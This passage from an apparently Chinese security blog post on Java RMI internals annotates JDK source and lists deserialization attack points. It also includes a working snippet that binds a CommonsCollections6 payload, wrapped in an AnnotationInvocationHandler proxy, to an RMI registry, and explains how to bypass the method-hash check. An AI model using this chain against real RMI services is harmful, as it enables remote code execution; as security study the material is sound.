* <span class="doctag">@return</span>              加载成功的类对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> MalformedURLException 如果 codebase URL 格式非法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException 如果类无法通过任一方式加载</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String codebase, String name,</span><br><span class="line">                                 ClassLoader defaultLoader)</span><br><span class="line">    <span class="keyword">throws</span> MalformedURLException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 codebase 字符串转换为 URL 数组</span></span><br><span class="line">    URL[] urls;</span><br><span class="line">    <span class="keyword">if</span> (codebase != <span class="literal">null</span>) &#123;</span><br><span class="line">        urls = pathToURLs(codebase); <span class="comment">// 将 codebase 转为 URL[]</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        urls = getDefaultCodebaseURLs(); <span class="comment">// 获取默认的 codebase URL（通常是 java.rmi.server.codebase）</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 优先尝试使用默认类加载器加载类</span></span><br><span class="line">    <span class="keyword">if</span> (defaultLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果默认类加载器加载失败，则使用远程 codebase URL 进行加载</span></span><br><span class="line">    <span class="keyword">return</span> loadClass(urls, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>getDefaultCodebaseURLs</code> 实际上返回的是 <code>codebaseProperty</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回一个 URL 数组，内容是根据系统属性</span></span><br><span class="line"><span class="comment"> * &quot;java.rmi.server.codebase&quot; 的值构造出的路径。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 这个方法会在第一次调用时，将 codebase 字符串解析为 URL 数组并缓存，</span></span><br><span class="line"><span class="comment"> * 后续调用直接返回缓存结果。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> URL[] 表示默认 codebase 的 URL 路径数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> MalformedURLException 如果 codebase 中包含非法的 URL 格式</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> URL[] getDefaultCodebaseURLs()</span><br><span class="line">    <span class="keyword">throws</span> MalformedURLException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 如果还没有解析过，就将 codebaseProperty（系统属性）转换为 URL 数组。</span></span><br><span class="line"><span class="comment">     * 如果解析失败，可能会抛出 MalformedURLException。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (codebaseURLs == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (codebaseProperty != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 将 codebase 字符串转为 URL[] 并缓存</span></span><br><span class="line">            codebaseURLs = pathToURLs(codebaseProperty);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 没有设置 codebase 属性，则使用空数组</span></span><br><span class="line">            codebaseURLs = <span class="keyword">new</span> <span class="title class_">URL</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回缓存的 URL 数组</span></span><br><span class="line">    <span class="keyword">return</span> codebaseURLs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>LoaderHandler</code> 的静态代码块中 <code>codebaseProperty</code> 被初始化，读取的是本地配置的 <code>java.rmi.server.codebase</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &quot;java.rmi.server.codebase&quot; 属性的值，会在类初始化时被缓存。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 它用于指定远程类加载时所依赖的 URL（如 .class 文件或 JAR 包的位置），</span></span><br><span class="line"><span class="comment"> * 供客户端通过网络动态加载服务端的类。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 注意：该属性的值可能包含格式错误（malformed）的 URL。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">codebaseProperty</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="comment">// 在安全权限控制下获取系统属性 &quot;java.rmi.server.codebase&quot;</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">prop</span> <span class="operator">=</span> java.security.AccessController.doPrivileged(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">GetPropertyAction</span>(<span class="string">&quot;java.rmi.server.codebase&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果属性存在且不为空白，则缓存该属性值</span></span><br><span class="line">    <span class="keyword">if</span> (prop != <span class="literal">null</span> &amp;&amp; prop.trim().length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        codebaseProperty = prop;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>RMI 的整个过程设计多处反序列化，因此易被反序列化攻击：</p>
<ul>
<li>攻击客户端<ul>
<li><code>RegistryImp_Stub#lookup</code>：反序列化注册中心返回的 Stub</li>
<li><code>UnicastRef#invoke</code>：反序列化远调方法的执行结果</li>
<li><code>StreamRemoteCall#executeCall</code>：反序列化远程调用返回的异常类</li>
<li><code>DGCImpl_Stub#dirty</code></li>
</ul>
</li>
<li>攻击服务端<ul>
<li><code>UnicastServerRef#dispatch</code>：反序列化客户端传递的方法参数</li>
<li><code>DGCImpl_Skel#dispatch</code></li>
</ul>
</li>
<li>攻击注册中心<ul>
<li><code>RegistryImp_Stub#bind</code>：注册中心反序列化服务端传递传来的远程对象</li>
</ul>
</li>
</ul>
<h4 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a>攻击服务端</h4><p><code>UnicastServerRef#dispatch</code> 调用了<code>unmarshalValue</code>来反序列化客户端传来的远程方法参数，因此我们可以通过传递反序列化 payload 作为参数在服务端触发反序列化漏洞。</p>
<p>然而远程方法的参数是有参数类型的，所以我们进行远程方法调用的时候要求参数类型要与方法定义的参数类型相匹配，例如：</p>
<ul>
<li>如果远程方法的参数是 <code>Object</code> 类型的，那么我们之间传递反序列化 payload 是可以正常在远程触发反序列化漏洞的。</li>
<li>但是如果远程方法的参数与我们传递的反序列化 payload 的类型不匹配，那么我们在传递参数的时候在本地就会报类型错误。</li>
</ul>
<p>针对这种情况我们有如下尝试：</p>
<ul>
<li><p>如果我们在获取远程对象后通过反射调用远程方法并强制传入反序列化 payload ，此时会有 <code>java.lang.IllegalArgumentException: argument type mismatch</code> 报错，这说明反射调用和正常调用一样会有参数检查。</p>
</li>
<li><p>如果我们在另外定义一个与我们参数类型匹配的方法，则 不匹配则会有 <code>java.rmi.UnmarshalException: unrecognized method hash: method not supported by remote object</code> 报错。这是因为客户端方法的哈希和服务端方法的哈希不同，<code>hashToMethod_Map</code> 找不到对应的方法。</p>
</li>
</ul>
<p>从上述尝试中我们发现，其实参数类型的校验始终发生在本地，远程反序列化参数之前都不知道我们传递的参数是什么，更谈不上参数类型的校验。</p>
<p>前面第二种尝试可以绕本地参数类型的校验，我们只需要在这种方法的基础上想办法修改远程方法调用时传递的方法的哈希就可以在服务端反序列化参数。</p>
<p>最直接的修改哈希的方法就是通过调试在 <code>RemoteObjectInvocationHandler</code> 调用 <code>invokeRemoteMethod</code> 的时候修改 <code>getMethodHash(method)</code> 获取到的哈希。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理远程方法调用。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">invokeRemoteMethod</span><span class="params">(Object proxy,</span></span><br><span class="line"><span class="params">                                  Method method,</span></span><br><span class="line"><span class="params">                                  Object[] args)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用远程对象的 invoke 方法，传递代理对象、方法、参数和方法的哈希值</span></span><br><span class="line">        <span class="keyword">return</span> ref.invoke((Remote) proxy, method, args,</span><br><span class="line">                          getMethodHash(method));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>另一种方法就是通过 Java Agent 技术进行字节码插桩，以此来修改方法哈希。</p>
<h4 id="攻击注册中心"><a href="#攻击注册中心" class="headerlink" title="攻击注册中心"></a>攻击注册中心</h4><p>注册中心和服务端是可以分开的，服务端可以使用 <code>Naming</code> 提供的接口来操作注册中心。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>, hello);</span><br></pre></td></tr></table></figure></div>

<p>前面分析过，这种写法本质上等价于下面这个写法：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">registry.bind(<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>, hello);</span><br></pre></td></tr></table></figure></div>

<p>这里获取到的实际上就是 <code>Registry</code> 的动态代理 <code>ResgitryImpl_Stub</code>，其中的 <code>bind</code> 方法依然存在序列化和反序列化。服务端将待绑定的对象序列化，注册中心收到后反序列化。</p>
<p>目前来看，貌似注册中心没有身份验证的功能，客户端都可以进行 <code>bind</code>、<code>unbind</code>、<code>rebind</code> 这些操作。</p>
<p>这里 <code>bind</code> 的参数因为是远程对象，所以要求是 <code>Remote</code> 类型。</p>
<p>我们知道 <code>HashMap</code> 类型在反序列化的时候键值对都会分别被反序列化：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 读取阈值（被忽略）、加载因子以及其他隐藏的内容</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="comment">// 重新初始化HashMap</span></span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="comment">// 检查加载因子是否有效</span></span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 读取并忽略桶的数量</span></span><br><span class="line">    s.readInt();</span><br><span class="line">    <span class="comment">// 读取映射的数量（即HashMap的大小）</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="comment">// 检查映射数量是否有效</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// 如果映射数量大于零，则进行初始化</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">// 读取键和值，并将映射放入HashMap中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject(); <span class="comment">// 读取键对象</span></span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject(); <span class="comment">// 读取值对象</span></span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>); <span class="comment">// &lt;-- 调用hash函数并插入键值对</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此可以使用 <code>AnnotationInvocationHandler</code> 来动态代理 <code>Remote</code> 接口，并且设置 <code>memberValues</code> 为 <code>HashMap</code>，然后 <code>HashMap</code> 中再存放反序列化的 payload。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (!type.isAnnotation() || <span class="comment">//  `type` 还要继承自 `Annotation`</span></span><br><span class="line">        superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">        superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.type = type; <span class="comment">//  `memberTypes` 中的 `key` 是构造时传入的 `type` 对应的类中的所有方法名字符串</span></span><br><span class="line">    <span class="built_in">this</span>.memberValues = memberValues; <span class="comment">// `name` 是构造时传入的 `memberValues` 中的某个 `key`。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>此时生成的动态代理对象继承于 <code>Remote</code>，符合参数条件，并且动态代理在反序列化的时候会反序列化 <code>AnnotationInvocationHandler</code> 进而反序列化 <code>memberValues</code> 成员（即 <code>HashMap</code>），并最终反序列化 <code>HashMap</code> 中的键值对触发反序列化 payload。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(<span class="string">&quot;sky123&quot;</span>, CommonsCollections6.getPayload());</span><br><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, hashMap);</span><br><span class="line"><span class="type">Remote</span> <span class="variable">remoteObject</span> <span class="operator">=</span> (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, handler);</span><br><span class="line"></span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">registry.bind(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObject&quot;</span>, remoteObject);</span><br></pre></td></tr></table></figure></div>

<h4 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h4><p>如果攻击的目标作为 Client 端，也就是在 Registry 地址可控，或 Registry&#x2F;Server 端可控，也是可以导致攻击的。客户端主要有两个交互行为，第一是从 Registry 端获取调用服务的 stub 并反序列化，第二步是调用服务后获取执行结果并反序列化。</p>
<p>这部分攻击实战意义较少，并且与上述讨论的攻击 Server 端和 Registry 端的攻击都是镜像行为，所以这里简单描述一下流程就不再演示了。</p>
<ul>
<li><p>恶意 Server Stub：同攻击 Registry 端，Client 端在 Registry 端 lookup 后会拿到一个 Server 端注册在 Registry 端的代理对象并反序列化触发漏洞。</p>
</li>
<li><p>恶意 Server 端返回值：同攻击 Server 端的恶意服务参数，Server 端返回给 Client 端恶意的返回值，Client 端反序列化触发漏洞，不再赘述。</p>
</li>
<li><p>动态类加载：同攻击 Server 端的动态类加载，Server 端返回给 Client 端不存在的类，要求 Client 端去 codebase 地址远程加载恶意类触发漏洞，不再赘述。</p>
</li>
</ul>
<h4 id="攻击DGC"><a href="#攻击DGC" class="headerlink" title="攻击DGC"></a>攻击DGC</h4><h2 id="JEP290"><a href="#JEP290" class="headerlink" title="JEP290"></a>JEP290</h2><p>JEP 290 是 Java 中非常重要的一个安全增强提案，主要用于 <strong>增强 Java 反序列化的安全性控制</strong>。它在 Java 9 中引入，核心思想是 <strong>为反序列化过程增加“白名单”机制</strong>，防止反序列化任意类造成的远程代码执行（RCE）等安全问题。</p>
<p>虽然这个提案是在 Java9 提出的，但在 JDK6、7、8 的高版本中也引入了这个机制（JDK8121、JDK7u131、JDK6u141）。</p>
<h1 id="JNDI（Java-Naming-and-Directory-Interface）"><a href="#JNDI（Java-Naming-and-Directory-Interface）" class="headerlink" title="JNDI（Java Naming and Directory Interface）"></a>JNDI（Java Naming and Directory Interface）</h1>
		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Java RMI &amp; JNDI</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2025-08-25 01:06:24</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-08-25 01:04:18
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2025/08/25/Java RMI &amp; JNDI/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/java-web/">#java web</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/08/19/Unicorn%20%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Unicorn 使用总结</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">Java RMI &amp; JNDI</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#RMI%EF%BC%88Remote-Method-Invocation%EF%BC%89"><span class="nav-text">RMI（Remote Method Invocation）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RMI%E7%9A%84%E4%B8%BB%E8%A6%81%E7%BB%84%E4%BB%B6"><span class="nav-text">RMI的主要组件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%8E%A5%E5%8F%A3%EF%BC%88Remote-Interface%EF%BC%89"><span class="nav-text">远程接口（Remote Interface）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E5%AE%9E%E7%8E%B0%E7%B1%BB%EF%BC%88Remote-Object-Implementation%EF%BC%89"><span class="nav-text">远程对象实现类（Remote Object Implementation）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%98%E6%A0%B9%EF%BC%88Stub%EF%BC%89%E5%92%8C%E9%AA%A8%E6%9E%B6%EF%BC%88Skeleton%EF%BC%89"><span class="nav-text">存根（Stub）和骨架（Skeleton）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RMI-%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%EF%BC%88RMI-Registry%EF%BC%89"><span class="nav-text">RMI 注册中心（RMI Registry）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8-RMI-%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="nav-text">启动 RMI 注册中心</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%B3%A8%E5%86%8C%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="nav-text">服务端注册远程对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%9F%A5%E6%89%BE%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="nav-text">客户端查找远程对象</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RMI-%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="nav-text">RMI 工作流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C"><span class="nav-text">服务注册</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E5%88%9B%E5%BB%BA"><span class="nav-text">远程对象创建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E5%88%9B%E5%BB%BA"><span class="nav-text">注册中心创建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%86%8C"><span class="nav-text">远程对象注册</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="nav-text">服务发现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%83%A8%E5%88%86"><span class="nav-text">客户端&#x2F;服务端部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E9%83%A8%E5%88%86"><span class="nav-text">注册中心部分</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E8%B0%83%E7%94%A8"><span class="nav-text">服务调用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%83%A8%E5%88%86"><span class="nav-text">客户端部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%83%A8%E5%88%86"><span class="nav-text">服务端部分</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DGC"><span class="nav-text">DGC</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DGC-%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-text">DGC 初始化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%83%A8%E5%88%86-1"><span class="nav-text">客户端部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" 